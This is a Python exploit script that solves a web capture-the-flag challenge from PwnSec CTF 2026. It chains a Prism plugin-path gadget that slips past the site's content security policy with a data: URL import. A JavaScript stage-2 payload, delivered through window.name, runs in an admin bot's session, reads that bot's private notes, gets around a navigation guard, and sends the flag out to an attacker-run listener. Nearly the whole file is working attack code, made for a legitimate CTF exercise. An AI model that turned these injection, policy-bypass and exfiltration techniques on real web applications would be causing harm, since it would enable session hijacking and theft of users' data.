#!/usr/bin/env python3
"""
mouse-in-the-house — PwnSec CTF 2026 (web)

Chain:
  1. Create a 78-char note whose body is a Prism config gadget:
        <a data-prism-plugins data-prism-plugin-path=data:text/jscript,import(name)//>
     Prism (loaded from esm.sh) reads data-prism-* from the DOM and does
        import(pluginPath + id + ".js")  ==>  import("data:text/jscript,import(name)//.js")
     CSP script-src allows `data:`, so this runs `import(name)` (window.name = our stage-2).
  2. Attacker page (the bot's first, external navigation) sets window.name to a
     data: URL holding STAGE2, then top-navigates the bot to  APP_ORIGIN/notes/<gadget>
     (cross-site GET ⇒ sameSite=lax bot cookie is sent ⇒ bot session active).
  3. STAGE2 (runs in bot session, app origin):
        - fetch('/notes/?search=')   -> bot sees no Sec-Fetch-* over http ⇒ 200 + full id list
        - fetch('/notes/<id>')       -> read the bot-owned flag note
        - history.pushState(0,0,'/') -> frame URL no longer starts with /notes/
        - location = ATTACKER/log?f=<flag>  -> bot's nav guard no longer blocks it ⇒ exfil

Usage (local defaults shown):
  python3 solve.py \
      --app   http://localhost:3010 \
      --bot   http://localhost:3011 \
      --listen-host 0.0.0.0 --listen-port 9000 \
      --attacker-url http://atk:9000        # URL the *bot* uses to reach THIS script

Remote: run this on a host the remote bot can reach over the internet, pass the remote
--app / --bot, and set --attacker-url to this host's public URL. APP_ORIGIN (the origin the
bot uses internally, usually http://web:3000) is auto-read from the bot's index page unless
you pass --app-origin.
"""
import argparse, re, sys, threading, time, urllib.parse
import http.server, socketserver
import requests

GADGET_BODY = '<a data-prism-plugins data-prism-plugin-path=data:text/jscript,import(name)//>'
assert len(GADGET_BODY) <= 80, len(GADGET_BODY)

STAGE2 = r"""
(async () => {
  let o;
  try {
    // The remote bot uses http://127.0.0.1:3000, which Chromium treats as a
    // trustworthy origin and therefore adds Sec-Fetch-Mode: cors to fetch().
    // Prime the navigation-only search response with a speculation-rule
    // prefetch, then read it back from the same-origin HTTP cache.
    const u = '/notes/?search=';
    const s = document.createElement('script');
    s.type = 'speculationrules';
    s.nonce = document.scripts[0].nonce;
    s.text = JSON.stringify({prefetch:[{source:'list', urls:[u]}]});
    document.head.append(s);
    await new Promise(r => setTimeout(r, 2500));
    const t = await (await fetch(u, {cache:'only-if-cached', mode:'same-origin'})).text();
    const ids = [...new Set([...t.matchAll(/\/notes\/([a-f0-9]{8})/g)].map(m => m[1]))];
    let flag = '';
    for (const id of ids) {
      const tt = await (await fetch('/notes/' + id)).text();
      const m = tt.match(/(pwnsec|flag|PWNSEC|CTF)\{[^}]*\}/);
      if (m) { flag = m[0]; break; }
    }
    o = 'f=' + encodeURIComponent(flag || ('NONE:' + ids.join(',')));
  } catch (e) { o = 'e=' + encodeURIComponent((e && e.message) || ('' + e)); }
  history.pushState(0, 0, '/');
  location = 'ATTACKER_BASE/log?' + o;
})();
""".strip()

captured = {"flag": None}


def make_handler(app_origin, gadget_id, attacker_base):
    stage2 = STAGE2.replace("ATTACKER_BASE", attacker_base)
    name_value = "data:text/javascript," + urllib.parse.quote(stage2, safe="")
    redirect = app_origin.rstrip("/") + "/notes/" + gadget_id
    import json as _json
    page = ("<!doctype html><title>a</title><script>window.name=" + _json.dumps(name_value) +
            ";location=" + _json.dumps(redirect) + ";</script>").encode()

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            print("[*] inbound:", self.path, flush=True)
            u = urllib.parse.urlparse(self.path)
            if u.path == "/log":
                q = urllib.parse.parse_qs(u.query)
                if "f" in q:
                    val = q["f"][0]
                    print("\n[+] EXFIL:", val)
                    m = re.search(r"(pwnsec|flag|PWNSEC|CTF)\{[^}]*\}", val)
                    if m:
                        captured["flag"] = m.group(0)
                elif "e" in q:
                    print("\n[!] stage-2 error:", q["e"][0])
                self.send_response(200); self.send_header("Content-Type", "text/plain")
                self.end_headers(); self.wfile.write(b"ok"); return
            self.send_response(200); self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page))); self.end_headers()
            self.wfile.write(page)

        def log_message(self, *a):
            pass
    return H


def get_app_origin(bot_url):
    try:
        r = requests.get(bot_url, timeout=10)
        m = re.search(r"Challenge origin:\s*<code>([^<]+)</code>", r.text)
        if m:
            return m.group(1).strip()
    except Exception as e:
        print("[!] could not read bot index:", e)
    return None


def create_gadget(app_url):
    s = requests.Session()
    r = s.post(app_url.rstrip("/") + "/notes",
               data={"title": "g", "body": GADGET_BODY},
               headers={"Sec-Fetch-Mode": "navigate"},
               allow_redirects=False, timeout=15)
    loc = r.headers.get("Location", "")
    m = re.search(r"/notes/([a-f0-9]{8})", loc)
    if not m:
        print("[!] note creation failed:", r.status_code, r.text[:200]); sys.exit(1)
    return m.group(1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--app", default="http://localhost:3010", help="public app base URL (to create the note)")
    ap.add_argument("--bot", default="http://localhost:3011", help="bot base URL (/visit)")
    ap.add_argument("--app-origin", default=None, help="origin the BOT uses internally (default: auto/http://web:3000)")
    ap.add_argument("--attacker-url", default="http://atk:9000", help="URL the BOT uses to reach this script")
    ap.add_argument("--listen-host", default="0.0.0.0")
    ap.add_argument("--listen-port", type=int, default=9000)
    args = ap.parse_args()

    app_origin = args.app_origin or get_app_origin(args.bot) or "http://web:3000"
    print("[*] app (create note):", args.app)
    print("[*] bot:", args.bot)
    print("[*] app origin (bot-internal):", app_origin)
    print("[*] attacker url (bot-facing):", args.attacker_url)

    gid = create_gadget(args.app)
    print("[+] gadget note id:", gid)

    handler = make_handler(app_origin, gid, args.attacker_url.rstrip("/"))
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer((args.listen_host, args.listen_port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    print(f"[*] attacker server on {args.listen_host}:{args.listen_port}")

    for i in range(15):
        try:
            probe = requests.get(args.attacker_url, timeout=5)
            print("[*] public tunnel probe:", probe.status_code, len(probe.content))
            if probe.ok:
                break
        except requests.exceptions.RequestException as e:
            print("[*] public tunnel not ready:", e)
        time.sleep(1)

    print("[*] submitting attacker url to bot...")
    try:
        requests.post(args.bot.rstrip("/") + "/visit",
                      json={"url": args.attacker_url}, timeout=20)
    except requests.exceptions.RequestException as e:
        print("[*] bot request still running/timed out:", e)  # bot holds the connection ~60s

    for _ in range(90):
        if captured["flag"]:
            break
        time.sleep(1)

    if captured["flag"]:
        print("\n[+] FLAG:", captured["flag"])
        open("flag.txt", "w").write(captured["flag"] + "\n")
    else:
        print("\n[!] no flag captured — check attacker reachability / app origin / rate limit")


if __name__ == "__main__":
    main()
